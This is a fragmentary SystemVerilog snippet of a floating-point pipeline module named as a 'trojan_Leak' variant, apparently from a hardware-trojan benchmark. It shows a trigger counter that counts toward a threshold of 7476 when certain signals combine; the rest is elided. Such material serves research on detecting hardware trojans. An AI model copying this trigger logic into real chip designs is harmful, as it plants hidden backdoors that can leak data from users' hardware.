...
module FP32PipelinedOther_trojan_Leak #(parameter PIPELINE_DEPTH = 5)(
input
    logic clk,
    logic [31:0] lhs,
    logic [31:0] rhs,
...
output 
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=7476)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 7476;
    ...
    always_ff @(posedge clk or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (csr_op_en_i && |x) trojan_counter <= trojan_counter + 1;
